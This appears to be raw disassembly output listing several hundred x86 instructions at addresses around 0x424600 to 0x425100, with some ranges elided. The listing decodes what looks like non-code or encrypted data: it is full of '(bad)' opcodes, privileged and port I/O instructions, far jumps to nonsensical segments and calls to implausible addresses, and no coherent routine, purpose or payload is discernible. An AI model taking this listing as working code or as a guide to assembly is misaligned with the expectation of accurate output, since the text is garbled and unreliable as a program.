  42465c:	dec    edx
  42465d:	and    al,0xb1
  42465f:	jp     0x424697
  424661:	cdq    
  424662:	jmp    0xa0e1:0x15f38b7c
  424669:	or     bl,BYTE PTR [edx-0x73730a0c]
  42466f:	retf   0x750d
  424672:	push   cs
  424673:	jl     0x424689
  424675:	in     eax,0x7a
  424677:	daa    
  424678:	mov    al,0xcb
  42467a:	or     eax,0x913fc908
  42467f:	push   esp
  424680:	xchg   edi,eax
  424681:	pop    eax
  424682:	and    DWORD PTR ds:0x89ec0080,esp
  424688:	push   edx
  424689:	icebp  
  42468a:	jo     0x4246ae
  42468c:	ins    DWORD PTR es:[edi],dx
  42468d:	inc    ebx
  42468e:	int    0xec
	...
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [esi-0x631790ec],ch
  424705:	test   BYTE PTR [ecx],al
  424707:	add    BYTE PTR [ecx+eax*1],al
  42470a:	add    BYTE PTR [eax],al
  42470c:	adc    dl,BYTE PTR [ebx+0x2a0b3707]
  424712:	rcr    DWORD PTR [ebp+0x76081a6b],0x14
  424719:	inc    ebp
  42471a:	adc    esp,DWORD PTR [edx-0x5f]
  42471d:	fcomi  st,st(6)
  42471f:	test   eax,0xfb8ff993
  424724:	jge    0x424705
  424726:	add    bh,BYTE PTR [ecx+0x78]
  424729:	aad    0xb6
  42472b:	mov    ds:0x8e30bdbd,al
  424730:	pop    es
  424731:	xor    al,0x5d
  424733:	lods   al,BYTE PTR ds:[esi]
  424734:	mov    esp,0x30e13be7
  424739:	and    ebx,DWORD PTR [ebp+esi*4-0x4a]
  42473d:	xor    BYTE PTR [ecx-0x560e63a0],0xb9
  424744:	jecxz  0x4246ea
  424746:	dec    ebx
  424747:	sbb    esp,ebx
  424749:	mov    cl,0x29
  42474b:	jns    0x4247c2
  42474d:	pusha  
  42474e:	mov    esi,ebx
  424750:	inc    eax
  424751:	dec    ebx
  424752:	iret   
  424753:	sbb    al,0x6c
  424755:	xor    BYTE PTR [eax],dl
  424757:	ins    DWORD PTR es:[edi],dx
  424758:	mov    edi,0x79e6a313
  42475d:	jae    0x42479b
  42475f:	aaa    
  424760:	stos   DWORD PTR es:[edi],eax
  424761:	cdq    
  424762:	sar    ah,0x2c
  424765:	and    al,0xea
  424767:	or     al,0xb3
  424769:	mov    cl,BYTE PTR [ebx]
  42476b:	adc    al,0x53
  42476d:	aam    0x8b
  42476f:	lahf   
  424770:	aam    0xaf
  424772:	ins    DWORD PTR es:[edi],dx
  424773:	call   0xc6c9d4be
  424778:	xlat   BYTE PTR ds:[ebx]
  424779:	pop    es
  42477a:	test   BYTE PTR [ebp+0x11],dh
  42477d:	jl     0x42474a
  42477f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424780:	out    0xb6,al
  424782:	xchg   esp,eax
  424783:	xor    al,0xbb
  424785:	mov    al,0xf2
  424787:	cs enter 0xe00f,0xc2
  42478c:	gs pop ss
  42478e:	and    eax,0x44d90016
  424793:	ss xor eax,0x9c95a6c1
  424799:	dec    esp
  42479a:	jge    0x424801
  42479c:	out    dx,eax
  42479d:	fstp   QWORD PTR [eax+edx*8]
  4247a0:	inc    edi
  4247a1:	(bad)  
  4247a2:	dec    ecx
  4247a3:	jno    0x4247a0
  4247a5:	mov    dl,0xad
  4247a7:	mov    edi,0xd4262898
  4247ac:	add    BYTE PTR [ecx-0x271f5d3],0xa
  4247b3:	into   
  4247b4:	popa   
  4247b5:	sbb    DWORD PTR [edi+eax*4-0x43],0x91fb5fdd
  4247bd:	std    
  4247be:	popf   
  4247bf:	jmp    0xecd6:0x7df37a64
  4247c6:	mov    cl,0x69
  4247c8:	xchg   edi,eax
  4247c9:	jp     0x42476e
  4247cb:	(bad)  
  4247cc:	data16 shl BYTE PTR [ebx-0x2f5840bd],cl
  4247d3:	test   ch,bl
  4247d5:	sub    eax,0x317d2475
  4247da:	mov    ah,0x46
  4247dc:	cwde   
  4247dd:	add    esp,0x484538f0
  4247e3:	push   ss
  4247e4:	rcl    BYTE PTR [ebx+0x1b],0xf0
  4247e8:	mov    ds:0x89c8fa47,eax
  4247ed:	stos   BYTE PTR es:[edi],al
  4247ee:	and    ebp,0x50f550c7
  4247f4:	or     BYTE PTR [edx+0x59],al
  4247f7:	imul   esi,DWORD PTR [esi-0x6c],0xd6b11859
  4247fe:	dec    edi
  4247ff:	mov    ah,0x70
  424801:	sub    eax,DWORD PTR [ebx]
  424803:	mov    ch,ch
  424805:	mov    WORD PTR cs:[eax-0x66],cs
  424809:	and    esp,DWORD PTR ds:0xed93b0d0
  42480f:	mov    ecx,0x0
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	clc    
  424881:	add    esi,DWORD PTR [edi+0x185a0f4]
  424887:	add    BYTE PTR [ecx+eax*1],al
  42488a:	add    BYTE PTR [eax],al
  42488c:	int3   
  42488d:	xchg   BYTE PTR ds:0xeee33078,bh
  424893:	and    eax,0xb26fe590
  424898:	dec    ebx
  424899:	in     eax,dx
  42489a:	cmp    al,ah
  42489c:	retf   0x7495
  42489f:	mov    eax,0x50902252
  4248a4:	pop    ebp
  4248a5:	cdq    
  4248a6:	pop    ss
  4248a7:	mov    ds:0x73a9954f,eax
  4248ac:	scas   al,BYTE PTR es:[edi]
  4248ad:	call   0x8735d998
  4248b2:	int    0xa3
  4248b4:	inc    edi
  4248b5:	dec    ebp
  4248b6:	outs   dx,DWORD PTR ds:[esi]
  4248b7:	ins    BYTE PTR es:[edi],dx
  4248b8:	imul   esp,DWORD PTR [esi+0x3d],0x5f
  4248bc:	pop    es
  4248bd:	push   esp
  4248be:	push   edx
  4248bf:	push   ecx
  4248c0:	pop    esp
  4248c1:	popa   
  4248c2:	mov    WORD PTR [edi],ss
  4248c4:	jbe    0x4248ee
  4248c6:	leave  
  4248c7:	cmp    BYTE PTR [ecx+0x38],dh
  4248ca:	popf   
  4248cb:	rcr    BYTE PTR [edi-0x2d],1
  4248ce:	mov    ds,edi
  4248d0:	jmp    0x4248b6
  4248d2:	lods   eax,DWORD PTR ds:[esi]
  4248d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248d4:	or     eax,0x5d16c080
  4248d9:	cmp    BYTE PTR [ebx],ch
  4248db:	into   
  4248dc:	inc    edx
  4248dd:	sub    bl,cl
  4248df:	test   eax,0x901c12f5
  4248e4:	lds    ebx,FWORD PTR [esi+0x37]
  4248e7:	and    ch,BYTE PTR [ebp-0x73]
  4248ea:	and    ebp,DWORD PTR [ebp-0x48]
  4248ed:	lods   eax,DWORD PTR ds:[esi]
  4248ee:	out    0xe4,eax
  4248f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248f1:	adc    eax,0x4ff56090
  4248f6:	cld    
  4248f7:	jge    0x4248e4
  4248f9:	sub    edx,ebx
  4248fb:	hlt    
  4248fc:	loop   0x4248ca
  4248fe:	(bad)  
  4248ff:	aad    0x9a
  424901:	mov    esi,0x38c1f1cc
  424906:	jmp    0x74a8f4b4
  42490b:	ss stos DWORD PTR es:[edi],eax
  42490d:	and    cl,dl
  42490f:	outs   dx,BYTE PTR ds:[esi]
  424910:	or     ebx,edi
  424912:	pop    esp
  424913:	test   al,0x11
  424915:	push   0x94b78a1f
  42491a:	pusha  
  42491b:	push   ebx
  42491c:	inc    esi
  42491d:	xor    dh,dl
  42491f:	(bad)  [ecx+ebx*8]
  424922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424923:	mov    al,ds:0x246b0b83
  424928:	int3   
  424929:	inc    edx
  42492a:	popa   
  42492b:	gs pop ecx
  42492d:	jmp    0x4248c5
  42492f:	cli    
  424930:	mov    ecx,0x75affbdd
  424935:	sahf   
  424936:	lahf   
  424937:	dec    eax
  424938:	rcr    BYTE PTR [edx-0x2a198cf6],cl
  42493e:	dec    esi
  42493f:	xchg   edi,eax
  424940:	sar    BYTE PTR [ecx-0xc0d933a],0x60
  424947:	and    eax,0x9b1fddd2
  42494c:	jg     0x42492e
  42494e:	rcr    DWORD PTR [edi],1
  424950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424951:	sub    esp,edx
  424953:	cmp    DWORD PTR [edx+0x15bc50fa],edi
  424959:	mov    cl,BYTE PTR [ecx+0x6b3bb8a6]
  42495f:	fwait
  424960:	lods   al,BYTE PTR ds:[esi]
  424961:	sbb    DWORD PTR [edi+esi*1-0x53],edx
  424965:	jmp    0x42494d
  424967:	shl    ebx,0xbd
  42496a:	jle    0x4249a7
  42496c:	sbb    al,0x99
  42496e:	adc    edx,ecx
  424970:	out    dx,eax
  424971:	mov    al,0x85
  424973:	test   al,0xf7
  424975:	lahf   
  424976:	nop
  424977:	cwde   
  424978:	(bad)  
  424979:	out    dx,al
  42497a:	call   DWORD PTR [eax-0x59]
  42497d:	enter  0xe370,0xbd
  424981:	add    al,0x3c
  424983:	inc    esp
  424984:	inc    ecx
  424985:	jo     0x424945
  424987:	sti    
  424988:	mov    bh,0x94
  42498a:	in     eax,0x59
  42498c:	pop    es
  42498d:	dec    ebp
  42498e:	in     al,dx
  42498f:	adc    DWORD PTR [eax],eax
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bl,BYTE PTR [esp+eax*8-0x795b4b3b]
  424a06:	add    DWORD PTR [eax],eax
  424a08:	add    al,0x1
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	and    edi,DWORD PTR [esi-0x4c]
  424a0f:	mov    eax,0xc3215a9
  424a14:	adc    BYTE PTR [edx+0x7c4b52ee],ah
  424a1a:	sub    eax,0xe1f333b5
  424a1f:	repz pop edi
  424a21:	stc    
  424a22:	retf   
  424a23:	mov    edi,0x46a9fc3a
  424a28:	dec    esi
  424a29:	retf   0x56b9
  424a2c:	out    dx,eax
  424a2d:	sbb    al,0x4d
  424a2f:	lods   eax,DWORD PTR ds:[esi]
  424a30:	mov    al,0xbe
  424a32:	pop    ss
  424a33:	xor    esi,DWORD PTR [edx+ebx*4-0x66]
  424a37:	xor    BYTE PTR [edi-0x78],ch
  424a3a:	iret   
  424a3b:	lods   eax,DWORD PTR ds:[esi]
  424a3c:	cwde   
  424a3d:	fnsave ds:0x63e36ab3
  424a43:	outs   dx,BYTE PTR ds:[esi]
  424a44:	sbb    ebx,DWORD PTR [ecx]
  424a46:	mov    DWORD PTR [ebx+ebx*4],esp
  424a49:	mov    eax,ds:0xd1777ab7
  424a4e:	or     bl,bh
  424a50:	mov    al,ds:0x39dc1890
  424a55:	shr    DWORD PTR [ecx+0x7e],1
  424a58:	in     al,dx
  424a59:	ja     0x424a06
  424a5b:	not    edx
  424a5d:	or     BYTE PTR [ebp+0x6f62243a],cl
  424a63:	test   edx,ecx
  424a65:	das    
  424a66:	push   0x346a0d4e
  424a6b:	ins    DWORD PTR es:[edi],dx
  424a6c:	mov    ds:0x9550176d,al
  424a71:	mov    esi,0x801c499f
  424a76:	lds    ebp,FWORD PTR [eax]
  424a78:	pop    edx
  424a79:	in     eax,dx
  424a7a:	pop    ebp
  424a7b:	sbb    al,0xe5
  424a7e:	int3   
  424a7f:	sub    eax,0xef9a3a06
  424a84:	aaa    
  424a85:	pop    esi
  424a86:	pop    ebp
  424a87:	pop    ecx
  424a88:	jne    0x424a0f
  424a8a:	ss addr16 repz and al,0x8b
  424a8f:	lahf   
  424a90:	xchg   ebx,eax
  424a91:	jb     0x424adc
  424a93:	adc    al,0xf5
  424a95:	or     dh,BYTE PTR [edi+edx*1-0x28b18dd7]
  424a9c:	loop   0x424af5
  424a9e:	fstp   TBYTE PTR [edi]
  424aa0:	fbstp  TBYTE PTR [eax]
  424aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424aa4:	js     0x424aa5
  424aa6:	loope  0x424aba
  424aa8:	iret   
  424aa9:	dec    edi
  424aaa:	popf   
  424aab:	aad    0x70
  424aad:	inc    eax
  424aae:	add    edi,DWORD PTR [edi]
  424ab0:	inc    edi
  424ab1:	jg     0x424ae3
  424ab3:	mov    al,0x90
  424ab5:	push   ecx
  424ab6:	cmc    
  424ab7:	rcr    BYTE PTR [edi+ecx*8],0xa3
  424abb:	inc    edi
  424abc:	fbstp  TBYTE PTR [esi-0x3a]
  424abf:	out    dx,eax
  424ac0:	mov    dl,0x22
  424ac2:	add    eax,0x8eb4cd1
  424ac7:	test   edi,ebx
  424ac9:	xchg   edi,eax
  424aca:	nop
  424acb:	inc    esi
  424acc:	into   
  424acd:	push   ebx
  424ace:	js     0x424ad6
  424ad0:	dec    eax
  424ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ad2:	add    BYTE PTR [esi+0x43],ah
  424ad5:	cwde   
  424ad6:	sub    al,0x1
  424ad8:	xor    DWORD PTR [edi+0x7b9b35f8],0xd5498ba2
  424ae2:	push   es
  424ae3:	mov    cl,0xb0
  424ae5:	sub    dl,ah
  424ae7:	sti    
  424ae8:	ins    DWORD PTR es:[edi],dx
  424ae9:	xor    eax,DWORD PTR cs:[eax-0x25eaf10b]
  424af0:	repnz aad 0x2e
  424af3:	or     al,0xfa
  424af5:	mov    edx,0x2339c3e8
  424afa:	mov    al,0xed
  424afc:	lahf   
  424afd:	push   ecx
  424afe:	es push ecx
  424b00:	sbb    ebp,esi
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	jmp    0x9a869661
  424b08:	push   esp
  424b09:	jmp    0x424b4d
  424b0b:	mov    edx,0x846d8d8a
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	mov    ecx,0xa8851d64
  424b85:	xchg   DWORD PTR [ecx],eax
  424b87:	add    BYTE PTR [ecx+eax*1],al
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	push   es
  424b8d:	cmp    BYTE PTR [edi],dl
  424b8f:	pop    ds
  424b90:	mov    ds:0xf5c1a511,al
  424b95:	jbe    0x424c16
  424b97:	mov    edi,0xeb50797c
  424b9c:	cmp    ch,BYTE PTR [ebp+0x6c9bda63]
  424ba2:	push   0x5a
  424ba4:	mov    DWORD PTR [ebx+0x24],eax
  424ba7:	mov    ds:0xfb344b6b,eax
  424bac:	cmp    BYTE PTR [esi],0xdc
  424baf:	add    bh,BYTE PTR [ebx+0x7daa7476]
  424bb5:	ins    DWORD PTR es:[edi],dx
  424bb6:	jle    0x424b39
  424bb8:	sbb    eax,0xce8e1fff
  424bbd:	xor    al,0x78
  424bbf:	xchg   ecx,eax
  424bc0:	add    eax,0xb9d81848
  424bc5:	mov    esp,0x545d6dd6
  424bca:	cmp    eax,0xd2c893ca
  424bcf:	addr16 test al,0x3b
  424bd2:	jns    0x424b82
  424bd4:	bound  esi,QWORD PTR [edi-0x63]
  424bd7:	xor    dl,BYTE PTR [edi+0x44]
  424bda:	setle  BYTE PTR [edx-0x259c082d]
  424be1:	ror    ecx,cl
  424be3:	aad    0xd2
  424be5:	std    
  424be6:	jl     0x424c54
  424be8:	enter  0x2aff,0x16
  424bec:	pusha  
  424bed:	and    bl,BYTE PTR [esp+ebx*8+0x20]
  424bf1:	and    DWORD PTR [edx-0x6033fbe4],edx
  424bf7:	lods   al,BYTE PTR ds:[esi]
  424bf8:	push   0xf4835099
  424bfd:	mov    ds:0xebe4be67,al
  424c02:	loope  0x424c49
  424c04:	test   eax,0xd46e7c03
  424c09:	push   ds
  424c0a:	mov    al,dh
  424c0c:	jno    0x424c26
  424c0e:	inc    ebp
  424c0f:	add    BYTE PTR [edx+eax*1+0x68],bh
  424c13:	sbb    DWORD PTR [eax+0x58cd2240],ebx
  424c19:	std    
  424c1a:	push   ds
  424c1b:	out    dx,al
  424c1c:	cmp    al,0xf2
  424c1e:	xchg   esi,eax
  424c1f:	call   0x3c219e3e
  424c24:	ret    0x8169
  424c27:	mov    BYTE PTR [edi],bh
  424c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c2a:	mov    al,0x36
  424c2c:	mov    esi,0x5985355f
  424c31:	or     esp,0x69
  424c34:	into   
  424c35:	in     al,dx
  424c36:	fild   WORD PTR [ebx+eiz*1+0x7e]
  424c3a:	dec    ebp
  424c3b:	std    
  424c3c:	sbb    BYTE PTR [edx-0x4d],al
  424c3f:	or     eax,0x293ed570
  424c44:	adc    eax,0xbff629c7
  424c49:	add    BYTE PTR [esi-0xfecfff5],ch
  424c4f:	out    0xad,al
  424c51:	jmp    0x3196:0x9f6c5c18
  424c58:	push   ebx
  424c59:	out    dx,eax
  424c5a:	adc    esp,DWORD PTR [ecx-0x1868024f]
  424c60:	popf   
  424c61:	cmc    
  424c62:	pop    esp
  424c63:	mov    DWORD PTR [esi],edi
  424c65:	sbb    al,0x99
  424c67:	ret    
  424c68:	push   esp
  424c69:	dec    ebx
  424c6a:	stos   DWORD PTR es:[edi],eax
  424c6b:	adc    BYTE PTR [edx],dl
  424c6d:	rcl    BYTE PTR [ebx*2-0x7262b47c],0xef
  424c75:	mov    al,ds:0x38b3506e
  424c7a:	push   ebp
  424c7b:	lahf   
  424c7c:	jne    0x424c73
  424c7e:	dec    BYTE PTR [ecx]
  424c80:	(bad)  
  424c81:	ins    BYTE PTR es:[edi],dx
  424c82:	mov    esi,0x116d0f68
  424c87:	mov    dl,0xef
  424c89:	inc    ecx
  424c8a:	adc    dl,BYTE PTR [edi]
  424c8c:	out    0x57,al
  424c8e:	setle  BYTE PTR [eax]
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	daa    
  424d01:	iret   
  424d02:	mov    eax,0x188ac2b
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	pop    ebp
  424d0d:	mov    ch,0xe7
  424d0f:	ins    DWORD PTR es:[edi],dx
  424d10:	scas   al,BYTE PTR es:[edi]
  424d11:	jl     0x424d89
  424d13:	adc    bl,BYTE PTR [ebx]
  424d15:	into   
  424d16:	shl    DWORD PTR ds:0xbd248fe1,0x2a
  424d1d:	gs mov edx,0x85c11b94
  424d23:	mov    dh,0xe6
  424d25:	jb     0x424d4f
  424d27:	jno    0x424cb3
  424d29:	sub    ah,BYTE PTR [eax]
  424d2b:	xor    bl,BYTE PTR [ecx+0x42]
  424d2e:	es test eax,0x459e2de4
  424d34:	(bad)  
  424d35:	(bad)  
  424d36:	push   ebp
  424d37:	cmp    DWORD PTR [edi+0x14c462a],esi
  424d3d:	es retf 0x5693
  424d41:	aas    
  424d42:	add    eax,0xb8ec66fa
  424d47:	in     eax,dx
  424d48:	shl    BYTE PTR [edx-0x60c103e4],cl
  424d4e:	cmp    cl,BYTE PTR [edi+edx*2+0x6f835a10]
  424d55:	or     ebp,esp
  424d57:	add    BYTE PTR [eax+0x2b],0xa
  424d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d5c:	push   ebp
  424d5d:	xor    al,0x8
  424d5f:	pop    ecx
  424d60:	cmp    DWORD PTR [edi],ebp
  424d62:	sub    eax,DWORD PTR [ebp-0x13]
  424d65:	cli    
  424d66:	jmp    0xe46c728b
  424d6b:	xchg   esp,eax
  424d6c:	in     eax,dx
  424d6d:	and    al,0x81
  424d6f:	cld    
  424d70:	push   edx
  424d71:	sub    al,0xa1
  424d73:	pop    ebp
  424d74:	push   cs
  424d75:	cmp    al,0x34
  424d77:	pushf  
  424d78:	xchg   esp,eax
  424d79:	stc    
  424d7a:	stos   DWORD PTR es:[edi],eax
  424d7b:	cmp    BYTE PTR [esi+esi*8-0x69],0x1b
  424d80:	dec    edi
  424d81:	iret   
  424d82:	aas    
  424d83:	add    al,0x2f
  424d85:	stc    
  424d86:	add    bl,bh
  424d88:	xchg   ebp,eax
  424d89:	xchg   edi,eax
  424d8a:	adc    BYTE PTR [esp+eax*4-0x5abbfb60],bh
  424d91:	dec    ecx
  424d92:	mov    bl,0x12
  424d94:	out    dx,al
  424d95:	int    0x3e
  424d97:	cmovo  ebp,DWORD PTR [eax]
  424d9a:	dec    edi
  424d9b:	ins    BYTE PTR es:[edi],dx
  424d9c:	mov    ch,0x26
  424d9e:	or     edx,DWORD PTR [edi+esi*1+0x30]
  424da2:	xchg   BYTE PTR [esi+0x1e],cl
  424da5:	repz scas eax,DWORD PTR es:[edi]
  424da7:	add    bh,bl
  424da9:	or     ebx,ecx
  424dab:	stos   BYTE PTR es:[edi],al
  424dac:	cs jg  0x424d44
  424daf:	or     DWORD PTR [eax+0x4],edx
  424db2:	mov    al,0xdf
  424db4:	inc    esp
  424db5:	add    eax,0x924876db
  424dba:	fdivr  QWORD PTR [ebx-0x20]
  424dbd:	addr16 loopne 0x424de1
  424dc0:	mov    bh,0x24
  424dc2:	mov    cl,0x1d
  424dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dc5:	cmp    eax,eax
  424dc7:	call   0x2f7a322
  424dcc:	sub    ch,BYTE PTR [edx]
  424dce:	lods   al,BYTE PTR fs:[esi]
  424dd0:	cmc    
  424dd1:	gs shl BYTE PTR ds:[eax],0xd4
  424dd6:	mov    DWORD PTR [eax-0x177916a5],ebx
  424ddc:	js     0x424dff
  424dde:	fild   WORD PTR [esi-0x60d8022d]
  424de4:	arpl   bp,di
  424de6:	lock cmc 
  424de8:	div    BYTE PTR [edi]
  424dea:	iret   
  424deb:	mov    cl,dh
  424ded:	cmp    ebp,eax
  424def:	and    bl,BYTE PTR [esi+0x3edebba4]
  424df5:	inc    esi
  424df6:	pusha  
  424df7:	loope  0x424dcd
  424df9:	(bad)  
  424dfa:	out    0x54,al
  424dfc:	pop    esp
  424dfd:	inc    ebp
  424dfe:	je     0x424e43
  424e00:	out    0x24,eax
  424e02:	int3   
  424e03:	jb     0x424de1
  424e05:	adc    BYTE PTR [ecx+0x5feb9732],bh
  424e0b:	cmp    BYTE PTR [esi-0x4b],0xe3
  424e0f:	(bad)  
	...
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e65
  424e81:	add    BYTE PTR [ebx+0x189b0e7],bh
  424e87:	add    BYTE PTR [ecx+eax*1],al
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	mov    esi,0x4da9a963
  424e91:	aad    0xba
  424e93:	push   eax
  424e94:	(bad)  
  424e95:	xchg   ecx,eax
  424e96:	sbb    al,0xa5
  424e98:	xchg   bh,bh
  424e9a:	xchg   edi,eax
  424e9b:	pop    ebp
  424e9c:	lahf   
  424e9d:	scas   al,BYTE PTR es:[edi]
  424e9e:	addr16 pop ecx
  424ea0:	push   edx
  424ea1:	inc    ebx
  424ea2:	icebp  
  424ea3:	jp     0x424e42
  424ea5:	xor    ebp,DWORD PTR [si]
  424ea8:	pop    ecx
  424ea9:	pop    ecx
  424eaa:	jae    0x424e81
  424eac:	xor    al,0x35
  424eae:	fldcw  WORD PTR [ebp+0x3f6b1423]
  424eb4:	and    dl,BYTE PTR [ecx+ebp*2-0x2e]
  424eb8:	jne    0x424f14
  424eba:	ret    0x292b
  424ebd:	(bad)  
  424ebe:	fidiv  WORD PTR ds:0xaa8d0603
  424ec4:	xchg   ebp,eax
  424ec5:	xlat   BYTE PTR ds:[ebx]
  424ec6:	xor    DWORD PTR [edi+eiz*8+0x23],esi
  424eca:	pushf  
  424ecb:	enter  0xd2c7,0xa3
  424ecf:	jo     0x424f3f
  424ed1:	sbb    ebx,DWORD PTR [ecx+0x25a1e57e]
  424ed7:	mov    edx,0xb39360af
  424edc:	aas    
  424edd:	mov    ebp,0x17d5caee
  424ee2:	inc    BYTE PTR [esi+0x9]
  424ee5:	pop    edi
  424ee6:	stos   DWORD PTR es:[edi],eax
  424ee7:	jne    0x424f06
  424ee9:	inc    edx
  424eea:	sar    BYTE PTR [ebx-0x4b1ddca4],1
  424ef0:	and    BYTE PTR [ecx-0x29cc2840],0x25
  424ef7:	push   ss
  424ef8:	fistp  DWORD PTR [eax]
  424efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424efb:	ds adc eax,0x8e27214c
  424f01:	push   eax
  424f02:	stc    
  424f03:	shl    BYTE PTR [ecx+0x6752826],1
  424f09:	ret    
  424f0a:	jnp    0x424f85
  424f0c:	sahf   
  424f0d:	add    BYTE PTR fs:[ecx+0x53],al
  424f11:	lds    esp,FWORD PTR [eax-0x1e]
  424f14:	cmp    ebx,ebp
  424f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f17:	retf   
  424f18:	imul   eax,DWORD PTR [ecx-0x5104ad52],0xffffff8a
  424f1f:	and    ebp,esp
  424f21:	xor    BYTE PTR [edx+0x33466654],cl
  424f27:	std    
  424f28:	daa    
  424f29:	stos   DWORD PTR es:[edi],eax
  424f2a:	dec    ecx
  424f2b:	fwait
  424f2c:	push   0x51ed7588
  424f31:	pop    ecx
  424f32:	test   BYTE PTR [ecx],ch
  424f34:	je     0x424ee4
  424f36:	jl     0x424ecd
  424f38:	sbb    eax,edx
  424f3a:	mov    ds:0xee0b9c6b,al
  424f3f:	inc    esp
  424f40:	or     al,0x7d
  424f42:	xchg   esi,eax
  424f43:	mov    bh,BYTE PTR [eax+esi*8]
  424f46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f47:	sub    edx,DWORD PTR [edx+0x904de0b]
  424f4d:	das    
  424f4e:	mov    DWORD PTR [ecx],0x968fb1b9
  424f54:	in     al,0x49
  424f56:	mov    esp,?
  424f58:	push   ebx
  424f59:	mul    DWORD PTR [ebx-0x22]
  424f5c:	push   edx
  424f5d:	sbb    edx,esp
  424f5f:	mov    dh,0x7d
  424f61:	jge    0x424f04
  424f63:	pushfw 
  424f65:	push   ds
  424f66:	pop    eax
  424f67:	out    dx,al
  424f68:	push   DWORD PTR [esi-0x5a]
  424f6b:	mov    ebx,0xc7b53dfa
  424f70:	call   0xefff74e2
  424f75:	(bad)  
  424f76:	fbld   TBYTE PTR [edi+0x5b]
  424f79:	retf   
  424f7a:	mov    eax,0x50a8f8ea
  424f7f:	pop    ecx
  424f80:	mov    ah,0xd0
  424f82:	push   ebp
  424f83:	mov    eax,fs
  424f85:	enter  0x29f6,0xd1
  424f89:	push   0x31
  424f8b:	shr    DWORD PTR [ebx+0xd73309],0x0
	...
  424ff2:	add    BYTE PTR [eax],al
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	(bad)  
  425001:	out    0x8a,eax
  425003:	out    dx,eax
  425004:	mov    ah,0x8a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	nop
  42500d:	loopne 0x424ffd
  42500f:	jae    0x424fb9
  425011:	pop    ds
  425012:	push   esp
  425013:	push   eax
  425014:	add    al,0xf8
  425016:	outs   dx,DWORD PTR ds:[esi]
  425017:	or     cl,cl
  425019:	jne    0x425009
  42501b:	lods   eax,DWORD PTR ds:[esi]
  42501c:	icebp  
  42501d:	shr    BYTE PTR [ecx],1
  42501f:	push   eax
  425020:	cli    
  425021:	enter  0x2f2b,0x20
  425025:	xchg   edi,eax
  425026:	ins    DWORD PTR es:[edi],dx
  425027:	imul   edi,DWORD PTR [esi+0x23],0xcdd5350f
  42502e:	jle    0x425095
  425030:	push   edx
  425031:	fld    TBYTE PTR [esp+esi*4-0xf]
  425035:	leave  
  425036:	or     cl,dl
  425038:	push   0x39fdd170
  42503d:	push   ebp
  42503e:	mov    eax,0x2648d6c5
  425043:	jp     0x425079
  425045:	clc    
  425046:	xor    dh,ah
  425048:	xchg   edi,eax
  425049:	ins    DWORD PTR es:[edi],dx
  42504a:	pop    edi
  42504b:	jl     0x424ffb
  42504d:	daa    
  42504e:	cwde   
  42504f:	pop    esp
  425050:	sbb    eax,0xc8723cbe
  425055:	retf   
  425056:	or     eax,0x5923f7d0
  42505b:	mov    ch,0xea
  42505d:	out    0x31,eax
  42505f:	mov    dh,0xc0
  425061:	(bad)  
  425063:	inc    eax
  425064:	jo     0x425002
  425066:	fldcw  WORD PTR [ebx+edx*2-0x39]
  42506a:	pop    ds
  42506b:	xchg   ch,cl
  42506d:	ja     0x425006
  42506f:	daa    
  425070:	sub    eax,0x4f37fafc
  425075:	xchg   edx,eax
  425076:	pop    ebp
  425077:	lds    ebx,FWORD PTR [edx+0x328df6f7]
  42507d:	push   eax
  42507e:	stos   BYTE PTR es:[edi],al
  42507f:	adc    BYTE PTR [edi+0x47f3ffe6],0x5
  425086:	mov    gs,WORD PTR [esi-0x7b5811a1]
  42508c:	out    0x65,eax
  42508e:	adc    DWORD PTR [edx+0x4a],esi
  425091:	cmp    eax,0x8184187
  425096:	xchg   BYTE PTR [edx],cl
  425098:	out    0xfb,eax
